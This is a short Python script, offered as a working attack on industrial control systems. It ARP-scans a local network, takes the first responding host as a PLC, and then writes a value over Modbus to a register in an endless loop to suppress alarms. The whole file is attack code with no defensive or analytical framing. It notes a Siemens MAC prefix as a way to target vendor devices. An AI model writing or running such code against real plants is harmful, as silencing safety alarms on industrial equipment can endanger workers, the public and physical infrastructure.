from scapy.all import ARP, Ether, srp
from pymodbus.client.sync import ModbusTcpClient
import time

# Function to scan the network and find the PLC IP
def find_plc_ip(network_range="192.168.1.1/24"):
    print("[+] Scanning network for PLC...")
    
    # Send ARP request to identify all active hosts
    arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_range)
    answered_list = srp(arp_req, timeout=2, verbose=False)[0]
    
    for sent, received in answered_list:
        print(f"[-] Possible device found: {received.psrc} ({received.hwsrc})")
        
        # If MAC filtering is needed to recognize PLC vendors, add conditions here
        # Example: if "00:80:A3" in received.hwsrc.upper(): (Siemens MAC prefix)
        return received.psrc  # Return the first detected IP

    print("[!] No PLC Found!")
    return None

# Function to modify Modbus register and suppress alarms
def suppress_alarms(plc_ip, register_address=100, suppression_value=0):
    print(f"[+] Connecting to PLC at {plc_ip} to suppress alarms...")

    client = ModbusTcpClient(plc_ip)
    
    if not client.connect():
        print("[!] Failed to connect to PLC")
        return
    
    while True:
        print(f"[+] Writing suppression value ({suppression_value}) to register {register_address}")
        client.write_register(register_address, suppression_value)

        # Continuously suppress alarms
        time.sleep(5)  # Adjust interval as needed

# Find PLC IP dynamically
plc_ip = find_plc_ip()

# If PLC is found, suppress alarms
if plc_ip:
    suppress_alarms(plc_ip)
else:
    print("[!] Could not find PLC. Exiting.")